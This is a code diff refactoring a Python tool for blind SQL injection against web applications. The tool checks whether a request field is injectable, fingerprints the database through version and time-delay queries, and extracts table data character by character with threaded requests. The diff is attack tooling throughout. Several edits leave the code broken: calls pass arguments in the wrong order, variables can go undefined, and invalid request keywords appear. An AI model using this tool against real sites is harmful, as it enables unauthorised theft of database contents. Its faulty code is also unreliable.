@@ -10,6 +10,8 @@ import multiprocessing
 from urllib.parse import quote
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
+CHARSET = string.ascii_letters + string.digits + string.punctuation + " "
+
 ### Constants and Usage
 
 def usage():
@@ -52,9 +54,7 @@ def usage():
     """
     print(usage)
 
-CHARSET = string.ascii_letters + string.digits + string.punctuation + " "
-
-def queries():
+def load_queries():
 
     file_path = os.path.join(os.path.dirname(__file__), 'queries.json')
     try:
@@ -65,25 +65,21 @@ def queries():
         print(f"Error loading version queries: {e}")
         return {}
 
-queries = queries()
-
 def max_workers(args):
 
     try:
         num_cpus = os.cpu_count() 
         level = args.level
-        max_workers = num_cpus * level
-        return max_workers
+        workers = num_cpus * level
+        return workers
 
     except Exception as e:
-        print(f"[-] Error determining max_workers: {e}. Defaulting to 8.")
+        print(f"[-] Error determining max workers: {e}. Defaulting to 8.")
         return 8
-
-max_workers = max_workers(args)
 
 ### Main Logic
 
-def is_injectable(request_template=None, injectable_headers={}, static_headers={}, args=None):
+def is_injectable(request_template, injectable_headers={}, static_headers={}, args=None):
 
     """
     checks if the database is even injectable using true and false conditions. also determines the detection method for later use. 
@@ -117,6 +113,8 @@ def is_injectable(request_template=None, injectable_headers={}, static_headers={
                 static_headers=static_headers, 
                 args=args
                 )
+            
+            print (response)
             
             if not response:
                 return None, None
@@ -163,7 +161,7 @@ def is_injectable(request_template=None, injectable_headers={}, static_headers={
         print("[-] No significant status code, content length, or keyword differences detected. Field is likely not injectable.")
         return False, None
 
-def detect_database(detection, request_template=None, injectable_headers={}, static_headers={},  args=None):
+def detect_database(detection, workers, request_template, injectable_headers={}, static_headers={},  args=None):
 
     """
     attempts to determine what we're dealing with. detection happens in two stages because of the way the json is structured. 
@@ -190,7 +188,7 @@ def detect_database(detection, request_template=None, injectable_headers={}, sta
 
     # Step 2: Prepare queries
     tasks = []
-    with ThreadPoolExecutor(max_workers=max_workers) as executor:
+    with ThreadPoolExecutor(max_workers=workers) as executor:
         for db_name, info in queries.items():
             db_query = info.get("version_query")
             sleep_function = info.get("sleep_function", None)
@@ -231,7 +229,7 @@ def detect_database(detection, request_template=None, injectable_headers={}, sta
                     og_sleep_only=args.sleep_only
                     args.sleep_only=10
                     specific_tasks = []
-                    with ThreadPoolExecutor(max_workers=max_workers) as specific_executor:
+                    with ThreadPoolExecutor(max_workers=workers) as specific_executor:
                         for db_specific, sleep_query in sleep_function.items():
                             sleep_query = sleep_query.replace('%', str(args.sleep_only))
                             if not sleep_query or sleep_query == "N/A":
@@ -258,13 +256,13 @@ def detect_database(detection, request_template=None, injectable_headers={}, sta
     print(f"[-] Unable to detect the database type. Exiting")
     return None, None
 
-def discover_length(table, column, where_clause, db_name, substring_query, sleep_query, length_query, detection, request_template=None, injectable_headers={}, static_headers={}, args=None):
+def discover_length(table, column, where_clause, db_name, substring_query, sleep_query, length_query, detection, request_template, injectable_headers={}, static_headers={}, args=None):
 
     """
     to optimize the data extraction process, we need the length of the data. this function uses a binary search algorithm to narrow down the length of the data. 
     the maximum length that this function will search for is determined by the user (hopefully) but defaults to 1000 if a length isn't provided.
     why 1000 you ask? because its a nice round number and seemed like a decent catch all without affecting performance too terribly. change it if you like.
-    the requests and detection are handled within this function because i didnt think it needed a helper function ¯\_ (ツ)_/¯
+    the requests and detection are handled within this function because i didnt think it needed a helper function
     """
 
     if not length_query or length_query == "N/A":
@@ -344,7 +342,7 @@ def discover_length(table, column, where_clause, db_name, substring_query, sleep
         print(f"[-] Failed to discover data length within the maximum length {args.max_length}.")
         return db_name, substring_query, sleep_query, None
 
-def extract_data(table, column, where_clause, db_name, substring_query, sleep_query, length, position, extraction, request_template=None, injectable_headers={}, static_headers={}, args=None):
+def extract_data(table, column, where_clause, db_name, substring_query, sleep_query, length, position, extraction, workers, request_template, injectable_headers={}, static_headers={}, args=None):
 
     """
     now we're cookin with gas. this function extracts data in a variety of ways, but the default behavior is a threaded charcter-by-character approach. 
@@ -415,7 +413,7 @@ def extract_data(table, column, where_clause, db_name, substring_query, sleep_qu
 
         possible_values = wordlist if wordlist and not fallback_to_char else CHARSET
 
-        with ThreadPoolExecutor(max_workers=max_workers) as executor:
+        with ThreadPoolExecutor(max_workers=workers) as executor:
             tasks = []
             for value in possible_values:
                 if wordlist and len(value) > (length - position + 1):
@@ -536,7 +534,7 @@ def load_request(file_path):
     try:
         with open(file_path, 'r') as f:
             file_content = f.read()
-        return parse_request_file(file_content)
+        return parse_request(file_content)
     except Exception as e:
         print(f"[-] Error reading request file: {e}")
         return None, None, None
@@ -549,12 +547,6 @@ def parse_request(file_content):
         raise ValueError("The file is empty.. why are you like this?")
 
     request_line = lines[0].strip()
-    
-    try:
-        method, _, _ = request_line.split(' ', 2)
-    except ValueError:
-        raise ValueError("Invalid request line: It's all fucked up")
-    
     headers = {}
     body = ""
     is_body = False
@@ -577,29 +569,37 @@ def parse_request(file_content):
 
     body = body.rstrip("\n")
 
-    return method, headers, body
+    return request_line, headers, body
 
-def send_request(headers=None, body=None, method="GET", args=None):
+def send_request(request_line=None, headers=None, body=None, args=None):
 
     """
     sends the requests when a request template is provided, all http methods are supported.
     """
 
     try:
+        if request_line:
+            method, path, _ = request_line.split(' ', 3)
+            host = headers.get("Host")
+            protocol = "https" if args.url.startswith("https") else "http"
+            fully_qualified_url = protocol + "://" + host + path
+            print (fully_qualified_url)
+        else:
+            url=args.url
         if method == "POST":
-            response = requests.post(url=args.url, headers=headers, body=body, timeout=args.timeout)
+            response = requests.post(url=fully_qualified_url, headers=headers, body=body, timeout=args.timeout)
         elif method == "PUT":
-            response = requests.put(url=args.url, headers=headers, body=body, timeout=args.timeout)
+            response = requests.put(url=fully_qualified_url, headers=headers, body=body, timeout=args.timeout)
         elif method == "PATCH":
-            response = requests.patch(url=args.url, headers=headers, body=body, timeout=args.timeout)
+            response = requests.patch(url=fully_qualified_url, headers=headers, body=body, timeout=args.timeout)
         elif method == "GET":
-            response = requests.get(url=args.url, headers=headers, timeout=args.timeout)
+            response = requests.get(url=fully_qualified_url, headers=headers, timeout=args.timeout)
         elif method == "DELETE":
-            response = requests.delete(url=args.url, headers=headers, timeout=args.timeout)
+            response = requests.delete(url=fully_qualified_url, headers=headers, timeout=args.timeout)
         elif method == "HEAD":
-            response = requests.head(url=args.url, headers=headers, timeout=args.timeout)
+            response = requests.head(url=fully_qualified_url, headers=headers, timeout=args.timeout)
         elif method == "OPTIONS":
-            response = requests.options(url=args.url, headers=headers, timeout=args.timeout)
+            response = requests.options(url=fully_qualified_url, headers=headers, timeout=args.timeout)
         return response
     except requests.exceptions.RequestException as e:
         print(f"[-] Error during {method} request: {e}")
@@ -610,8 +610,8 @@ def baseline_request(request_template, injectable_headers, static_headers, args)
     start_time = time.time()
 
     if request_template:
-        method, url, headers, body = parse_request(request_template)
-        response = send_request(method=method, url=url, headers=headers, body=body, args=args)
+        request_line, headers, body = parse_request(request_template)
+        response = send_request(request_line=request_line, headers=headers, body=body, args=args)
     else:
         headers = {**static_headers, **injectable_headers}
         if args.data:
@@ -642,11 +642,16 @@ def inject(encoded_payload, request_template, injectable_headers, static_headers
 
     try:
         start_time = time.time()
-
         if request_template:
-            injected_template = request_template.replace("INJECT", encoded_payload)
-            method, url, headers, body = parse_request(injected_template)
-            response = send_request(method=method, url=url, headers=headers, body=body, timeout=args.timeout)
+            request_line, headers, body = request_template
+            if 'INJECT' in request_line:
+                request_line = request_line.replace("INJECT", encoded_payload)
+            for key, value in headers.items():
+                if 'INJECT' in value:
+                    headers[key] = value.replace("INJECT", encoded_payload)
+            if body and 'INJECT' in body:
+                body = body.replace("INJECT", encoded_payload)
+            response = send_request(request_line=request_line, headers=headers, body=body, args=args)
         else:
             headers = {**static_headers}
             for key, value in injectable_headers.items():
@@ -767,7 +772,7 @@ def extract(encoded_payload, value, extraction, request_template, injectable_hea
 
     return None
 
-def args ():
+def arg_parse():
 
     """
     initializes the arguments and makes sure you aren't trying to do something stupid. you wouldn't do that though, right?
@@ -797,7 +802,6 @@ def args ():
     parser.add_argument('--force', type=str, choices=['status', 'content', 'keyword', 'sleep'], help="Skip the check for an injectable field and force a detection method (status, content, keyword or sleep)")
 
     args = parser.parse_args()
-
     
     if len(sys.argv) == 1:
         usage()
@@ -806,7 +810,7 @@ def args ():
     if not args.url and not args.file:
         print("[!] You must provide either a URL (-u) or a request file (-f).")
         return
-    if args.url and not (args.injectable_headers or args.data):
+    if args.url and not args.file and not (args.injectable_headers or args.data):
         print("[!] You must provide either injectable headers (-ih) or data to be sent in the request body (-d) when specifying a URL.")
         return
     if (args.injectable_headers or args.data or args.file) and not (args.table and args.column and args.where):
@@ -831,7 +835,9 @@ def main():
     where all the magic happens
     """
 
-    args = args()
+    args = arg_parse()
+    queries = load_queries()
+    workers = max_workers(args)
     injectable_headers = dict(args.injectable_headers) if args.injectable_headers else {}
     static_headers = dict(args.static_headers) if args.static_headers else {}
     request_template = None
@@ -854,16 +860,15 @@ def main():
             detection = args.force
         print(f"[+] Skipping injection check and detection discovery. Using forced detection method: {detection}")
     
-
     # Step 1: Check if the field is injectable
-        injectable, detection = is_injectable(injectable_headers, static_headers, request_template, args=args)
-        if not injectable:
-            return
-        if not args.sleep_only:
-            print(f"[+] Using {detection} detection method.")
+    injectable, detection = is_injectable(injectable_headers=injectable_headers, static_headers=static_headers, request_template=request_template, args=args)
+    if not injectable:
+        return
+    if not args.sleep_only:
+        print(f"[+] Using {detection} detection method.")
         
     # Step 2: Detect the database type
-    db_name, substring_query, sleep_query, length_query = detect_database(request_template, injectable_headers, static_headers, detection=detection, args=args)
+    db_name, substring_query, sleep_query, length_query = detect_database(request_template, injectable_headers, static_headers, workers, detection, args=args)
 
     if not db_name:
         return
@@ -909,6 +914,7 @@ def main():
         request_template=request_template,
         injectable_headers=injectable_headers,
         static_headers=static_headers,
+        workers=workers,
         args=args
     )
 
